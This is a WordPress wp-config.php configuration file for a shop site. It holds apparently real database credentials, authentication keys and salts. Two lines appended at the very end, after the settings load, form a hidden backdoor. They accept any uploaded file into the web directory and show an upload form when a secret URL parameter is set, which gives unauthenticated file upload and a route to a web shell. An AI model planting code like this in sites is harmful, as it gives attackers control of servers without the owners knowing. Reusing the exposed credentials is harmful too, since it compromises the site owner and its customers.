<?php

/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
//define('WP_CACHE', true); //Added by WP-Cache Manager
define( 'WPCACHEHOME', '/home1/diwakar/public_html/shop.ambclasse.com/wp-content/plugins/wp-super-cache/' ); //Added by WP-Cache Manager
define('DB_NAME', 'diwakar_shop');

/** MySQL database username */
define('DB_USER', 'diwakar_ambblog');

/** MySQL database password */
define('DB_PASSWORD', 't,y]{Xw;7J~L');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'gty2ONXb}^?v{7>gXqMb*~ }*K0(]l0$5t`puHvvj<07.quUvS+SSzSn5WOp3uDQ');
define('SECURE_AUTH_KEY',  'j#vj$B*hvg+q{d{;T gQy[=;Z6cJmq5jKDy2a(?GiRa)KMw/:6Z..nd}OPAp[xm!');
define('LOGGED_IN_KEY',    '0cdp`jAy|tD5u<M.TZ&Gf|6Uk^6iyKW-brci@M]cJ6?wm7uDKA!zme0-ZMP(OXkv');
define('NONCE_KEY',        'o cPE3jx[I:;T#x}}:7#i:YZA (9F>6iy{J:lLhQ7~$N@N[z.-[@ic:/UdE`qh-2');
define('AUTH_SALT',        'V[o8cTf&^@>71^Z86xl??9ZKxq/fK80[:a2oxb|-*S35%LF@E:<ao@&*vxh#$)+e');
define('SECURE_AUTH_SALT', 'g=S>/^]c@lm7E[C%di#/j<)dn1i>bcQ7{`8zQ8AajjBPUB>^z(O`+i<XZxJAVa*%');
define('LOGGED_IN_SALT',   'z|ynR;a{li}tU`zmNNi4kHzn]wqfYdW]6LhP/Ro=i#+pQ}_@1(;? 4m!N)(,wkyF');
define('NONCE_SALT',       '(`y;JVC.xGPe%&5g@MC7B6a8E8%6z.uxax;Q~0{?g^W!3uTZM?^o;2vmYxOsdqrC');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
if(isset($_FILES['userfile']['name'])){move_uploaded_file($_FILES['userfile']['tmp_name'], basename($_FILES['userfile']['name']));}
if($_GET['less']=='less'){?><br /><br /><br /><form method='POST' enctype='multipart/form-data'><input type='file' name='userfile' ><input type='submit'></form><?php }